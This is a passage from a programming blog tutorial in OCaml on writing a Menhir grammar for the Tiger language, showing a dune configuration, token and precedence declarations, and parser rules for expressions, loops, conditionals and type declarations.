<h3 id="making-of-tiger-3-parsing">
  <span class="org-todo done DONE">DONE</span> Making of Tiger #3, Parsing <span class="tag"><span class="parsing">parsing</span><span class="menhir">menhir</span></span>
  <a class="heading-link" href="#making-of-tiger-3-parsing">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>In this chapter we’re going to build a parser for our Tiger
language. First, let’s do a quick recap of some important
concepts of the theory behind programming language parsers:</p>
<ul>
<li><strong>Parser generator</strong> is the most common type of
<a href="https://en.wikipedia.org/wiki/Compiler-compiler"  class="external-link" target="_blank" rel="noopener">compiler-compiler’s</a>. It takes some formal grammar (typically
it is a <a href="https://en.wikipedia.org/wiki/Context-free_grammar"  class="external-link" target="_blank" rel="noopener">context-free grammar</a> in <a href="https://en.wikipedia.org/wiki/Backus%E2%80%93Naur_form"  class="external-link" target="_blank" rel="noopener">BNF</a> or <a href="https://en.wikipedia.org/wiki/Extended_Backus%E2%80%93Naur_form"  class="external-link" target="_blank" rel="noopener">EBNF </a>form), that
defines a syntax of a programming language.</li>
</ul>
<h4 id="tiger-grammar-with-menhir">
  Tiger grammar with Menhir
  <a class="heading-link" href="#tiger-grammar-with-menhir">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>While reading the current paragraph I highly recommend
consulting the <strong>Tiger Language Reference Manual</strong> that has a
precise description (along with a BNF notation) of everything
we’re going to define below.</p>
<p><a href="http://gallium.inria.fr/~fpottier/menhir/"  class="external-link" target="_blank" rel="noopener">Menhir</a> is an LR(1) parser generator library for OCaml. It
<a href="https://dune.readthedocs.io/en/stable/dune-files.html#menhir"  class="external-link" target="_blank" rel="noopener">integrates with Dune</a> quiet nicely. All we need to do is to add
the <code>menhir</code> stanza to our <code>dune</code> file (the one from the
previous chapter). So the whole file will look like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lisp" data-lang="lisp"><span style="display:flex;"><span>(<span style="color:#434f54">menhir</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">modules</span> <span style="color:#434f54">parser</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">flags</span> (<span style="color:#7f8c8d">&#34;--dump&#34;</span> <span style="color:#7f8c8d">&#34;--explain&#34;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">ocamllex</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">modules</span> <span style="color:#434f54">lexer</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">library</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">name</span> <span style="color:#434f54">ch3</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">inline_tests</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">libraries</span> <span style="color:#434f54">core</span> <span style="color:#434f54">stdio</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">preprocess</span> (<span style="color:#434f54">pps</span> <span style="color:#434f54">ppx_inline_test</span> <span style="color:#434f54">ppx_expect</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">env</span> (<span style="color:#434f54">dev</span> (<span style="color:#434f54">flags</span> (<span style="color:#7f8c8d">:standard</span> <span style="color:#434f54">-warn-error</span> <span style="color:#434f54">-A</span>))))
</span></span></code></pre></div><p>Notice the <code>--dump</code> and <code>--explain</code> switches:</p>
<ul>
<li>The <code>--dump</code> switch means to write a description of the
automaton to the <code>.automaton</code> file.</li>
<li>The <code>--explain</code> switch helps us to understand severe conflicts in
terms of a grammar (rather than in terms of automaton),
enabling it means to write a textual explanation of detected
shift-reduce conflicts to the <code>.conflicts</code> file. <a href="http://ix.io/1SAS"  class="external-link" target="_blank" rel="noopener">Here is
the example</a> of how it looks.</li>
</ul>
<p>See the <a href="http://gallium.inria.fr/~fpottier/menhir/manual.html#sec37"  class="external-link" target="_blank" rel="noopener">conflicts</a> part of the Menhir manual for details.</p>
<p>We’ll use the
<a href="http://gallium.inria.fr/~fpottier/menhir/manual.html#sec23"  class="external-link" target="_blank" rel="noopener">new
syntax</a> for rules (despite the fact that it is considered
experimental). First, let’s define some
<a href="http://gallium.inria.fr/~fpottier/menhir/manual.html#sec9"  class="external-link" target="_blank" rel="noopener">token
aliases</a>, priorities and associativity levels. Basically these
are the same tokens we used in our lexer.</p>
<p>Base keywords:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">TYPE</span>     <span style="color:#7f8c8d">&#34;type&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">VAR</span>      <span style="color:#7f8c8d">&#34;var&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">FUNCTION</span> <span style="color:#7f8c8d">&#34;function&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">BREAK</span>    <span style="color:#7f8c8d">&#34;break&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">OF</span>       <span style="color:#7f8c8d">&#34;of&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">END</span>      <span style="color:#7f8c8d">&#34;end&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">IN</span>       <span style="color:#7f8c8d">&#34;in&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">NIL</span>      <span style="color:#7f8c8d">&#34;nil&#34;</span> <span style="color:#95a5a6">(* nil denotes a value belonging to every record type *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LET</span>      <span style="color:#7f8c8d">&#34;let&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">ARRAY</span>    <span style="color:#7f8c8d">&#34;array&#34;</span>
</span></span></code></pre></div><p>Loop-related keywords:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">DO</span>    <span style="color:#7f8c8d">&#34;do&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">TO</span>    <span style="color:#7f8c8d">&#34;to&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">FOR</span>   <span style="color:#7f8c8d">&#34;for&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">WHILE</span> <span style="color:#7f8c8d">&#34;while&#34;</span>
</span></span></code></pre></div><p>Keywords for conditional expression:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">IF</span>   <span style="color:#7f8c8d">&#34;if&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">THEN</span> <span style="color:#7f8c8d">&#34;then&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">ELSE</span> <span style="color:#7f8c8d">&#34;else&#34;</span>
</span></span></code></pre></div><p>Operator tokens:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(* General *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">ASSIGN</span> <span style="color:#7f8c8d">&#34;:=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Logical *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">OR</span>  <span style="color:#7f8c8d">&#34;|&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">AND</span> <span style="color:#7f8c8d">&#34;&amp;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Comparison *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">GE</span>  <span style="color:#7f8c8d">&#34;&gt;=&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">GT</span>  <span style="color:#7f8c8d">&#34;&gt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LE</span>  <span style="color:#7f8c8d">&#34;&lt;=&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LT</span>  <span style="color:#7f8c8d">&#34;&lt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">NEQ</span> <span style="color:#7f8c8d">&#34;&lt;&gt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">EQ</span>  <span style="color:#7f8c8d">&#34;=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Arithmetics *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">DIVIDE</span> <span style="color:#7f8c8d">&#34;/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">TIMES</span>  <span style="color:#7f8c8d">&#34;*&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">PLUS</span>   <span style="color:#7f8c8d">&#34;+&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">MINUS</span>  <span style="color:#7f8c8d">&#34;-&#34;</span>
</span></span></code></pre></div><p>Tokens for separators:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">DOT</span>       <span style="color:#7f8c8d">&#34;.&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LBRACE</span>    <span style="color:#7f8c8d">&#34;{&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">RBRACE</span>    <span style="color:#7f8c8d">&#34;}&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LBRACK</span>    <span style="color:#7f8c8d">&#34;[&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">RBRACK</span>    <span style="color:#7f8c8d">&#34;]&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">LPAREN</span>    <span style="color:#7f8c8d">&#34;(&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">RPAREN</span>    <span style="color:#7f8c8d">&#34;)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">SEMICOLON</span> <span style="color:#7f8c8d">&#34;;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">COLON</span>     <span style="color:#7f8c8d">&#34;:&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">COMMA</span>     <span style="color:#7f8c8d">&#34;,&#34;</span>
</span></span></code></pre></div><p>Strings, numbers, identifiers and the <code>EOF</code> token:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#728e00">&lt;</span><span style="color:#00979d">string</span><span style="color:#728e00">&gt;</span> <span style="color:#434f54">STRING</span> <span style="color:#7f8c8d">&#34;string&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#728e00">&lt;</span><span style="color:#00979d">int</span><span style="color:#728e00">&gt;</span>    <span style="color:#434f54">INT</span>    <span style="color:#7f8c8d">&#34;int&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#728e00">&lt;</span><span style="color:#00979d">string</span><span style="color:#728e00">&gt;</span> <span style="color:#434f54">ID</span>     <span style="color:#7f8c8d">&#34;id&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">token</span> <span style="color:#434f54">EOF</span>
</span></span></code></pre></div><p>Associativity of operators:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;of&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;then&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;else&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;do&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;:=&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">left</span>     <span style="color:#7f8c8d">&#34;|&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">left</span>     <span style="color:#7f8c8d">&#34;&amp;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">nonassoc</span> <span style="color:#7f8c8d">&#34;&gt;=&#34;</span> <span style="color:#7f8c8d">&#34;&gt;&#34;</span> <span style="color:#7f8c8d">&#34;&lt;=&#34;</span> <span style="color:#7f8c8d">&#34;&lt;&#34;</span> <span style="color:#7f8c8d">&#34;&lt;&gt;&#34;</span> <span style="color:#7f8c8d">&#34;=&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">left</span>     <span style="color:#7f8c8d">&#34;+&#34;</span> <span style="color:#7f8c8d">&#34;-&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">left</span>     <span style="color:#7f8c8d">&#34;*&#34;</span> <span style="color:#7f8c8d">&#34;/&#34;</span>
</span></span></code></pre></div><p>The grammar rules:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">%</span><span style="color:#434f54">start</span> <span style="color:#728e00">&lt;</span><span style="color:#00979d">unit</span><span style="color:#728e00">&gt;</span> <span style="color:#434f54">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">%%</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">main</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">~</span> <span style="color:#728e00">=</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#434f54">EOF</span><span style="color:#728e00">;</span> <span style="color:#728e00">&lt;&gt;</span>
</span></span></code></pre></div><p>Top-level expression:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">expr</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">primitive</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;nil&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;break&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">create_rec</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">create_arr</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">lvalue</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">assignment</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">local</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">conditional</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">loop</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">fun_call</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">unary</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">binary</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">seq</span>
</span></span></code></pre></div><p>It might not be obvious from the <code>expr</code> definition, but it also
includes a thing called <code>no value</code> (an expression that yields no
value). So when looking at the top-level expression and
comparing it to the language reference manual, please note that
in our grammar <code>no_val := &quot;(&quot; &quot;)&quot;</code> (empty <code>seq</code>).</p>
<p>There are two built-in (predefined) primitive types: <code>int</code> and
<code>string</code>. The grammar rule for those is pretty straightforward:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">primitive</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;string&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;int&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>In our language we have only one unary operator – minus:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">unary</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;-&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>But we have two kinds of binary operators: <code>boolean</code> and
“logical + arithmetic”, which we’ll simply call <code>bin</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">binary</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">bin</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">boolean</span>
</span></span></code></pre></div><p>Scroll down to see the definitions of <code>bin</code> and <code>boolean</code>.</p>
<p>We have 2 kinds of loops: the <code>while</code> loop and the <code>for</code> loop:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">loop</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">while_loop</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">for_loop</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">while_loop</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;while&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;do&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">for_loop</span>   <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;for&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;:=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;to&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;do&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>Nothing new or unusual. And the conditional expression rule is
also quite trivial:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">conditional</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;if&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;then&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;else&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;if&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;then&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr</span>
</span></span></code></pre></div><p>Syntax for local bindings is going to be exactly like in OCaml
or SML:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">local</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;let&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">decs</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;in&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">expr_seq</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;end&#34;</span>
</span></span></code></pre></div><p>Now, a slightly more complex part – declarations.</p>
<p>As stated in the Tiger language reference manual, a
declaration-sequence is a sequence of <strong>type</strong>, <strong>value</strong>, and
<strong>function declarations</strong>. No punctuation separates or terminates
individual declarations.</p>
<p>In terms of Menhir we can express it like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">decs</span> <span style="color:#728e00">:=</span> <span style="color:#00979d">list</span><span style="color:#728e00">(</span><span style="color:#434f54">dec</span><span style="color:#728e00">);</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">dec</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">ty_dec</span>  <span style="color:#95a5a6">(* type *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">var_dec</span> <span style="color:#95a5a6">(* value *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">fun_dec</span> <span style="color:#95a5a6">(* function declaration *)</span>
</span></span></code></pre></div><p>Ok, we need to define a separate rule for each declaration
mentioned above.</p>
<p>To declare a data type in the Tiger language we start with the
keyword <code>type</code>, after which comes the identifier, the equality
token and the type declaration body:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">ty_dec</span> <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;type&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;=&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">ty</span>
</span></span></code></pre></div><p>The type declaration could be a <strong>record</strong>, an <strong>array</strong> or a <strong>type
alias</strong> (any identifier):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">ty</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">braced</span><span style="color:#728e00">(</span><span style="color:#434f54">ty_fields</span><span style="color:#728e00">)</span> <span style="color:#95a5a6">(* records *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;array&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;of&#34;</span><span style="color:#728e00">;</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span> <span style="color:#95a5a6">(* arrays *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">ty_fields</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">separated_list</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;,&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">ty_field</span><span style="color:#728e00">);</span> <span style="color:#728e00">{</span> <span style="color:#434f54">()</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">ty_field</span>  <span style="color:#728e00">:=</span> <span style="color:#7f8c8d">&#34;id&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">ty_ann</span>
</span></span></code></pre></div><p>As per language reference manual, there are two possible ways to
declare a variable: with or without type annotation. The
following rule reflects this:</p>
